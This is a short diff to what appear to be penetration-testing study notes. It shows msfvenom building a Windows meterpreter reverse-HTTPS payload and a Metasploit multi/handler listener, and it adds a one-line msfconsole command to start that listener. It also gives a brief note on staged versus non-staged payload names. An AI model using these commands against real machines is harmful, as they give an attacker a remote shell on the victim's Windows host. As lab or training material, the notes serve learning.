@@ -56,6 +56,7 @@ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=tun0 LPORT=443 -f exe -o
 msfconsole
 use multi/handler
 set payload windows/x64/meterpreter_reverse_https
+msfconsole -x "use multi/handler;set payload windows/x64/meterpreter_reverse_https;set LHOST tun0;set LPORT 443;run;"
 ```
 the forward slash indicates that is a "staged" payload, the one with the underscore means it’s non-staged and can be handled by program like nc
 
